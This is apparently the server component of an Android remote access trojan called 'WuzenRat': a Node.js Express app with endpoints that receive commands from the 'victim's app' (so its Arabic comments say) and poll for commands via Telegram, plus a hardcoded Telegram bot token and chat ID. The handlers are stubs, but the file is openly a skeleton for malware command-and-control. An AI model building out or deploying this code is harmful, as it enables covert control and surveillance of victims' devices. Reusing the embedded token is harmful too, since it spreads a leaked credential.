const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const token = process.env.BOT_TOKEN || "7822530211:AAFHlKhDrbGCbKOtzgVG7J_L6OjyI7doLNU";
const chatId = process.env.CHAT_ID || "8270107829";

app.use(express.json());

// Health check endpoint (لـ Render و UptimeRobot)
app.get('/', (req, res) => {
    res.send('WuzenRat is running ✅');
});

// الواجهة الرئيسية التي يتصل بها تطبيق Android
app.post('/api/command', (req, res) => {
    const { command, data } = req.body;
    console.log(`Command received: ${command}`);
    // هنا ضع منطق معالجة الأوامر من تطبيق الضحية
    res.json({ status: 'ok', message: 'Command executed' });
});

// مثال على endpoint لجلب الأوامر من Telegram (حسب هيكل WuzenRat)
app.get('/api/poll', (req, res) => {
    // هذا مجرد مثال – يستبدل بالكود الفعلي من المشروع
    res.json({ commands: [] });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ WuzenRat server running on port ${PORT}`);
    console.log(`🔑 Bot Token: ${token.substring(0, 10)}...`);
    console.log(`📱 Chat ID: ${chatId}`);
});
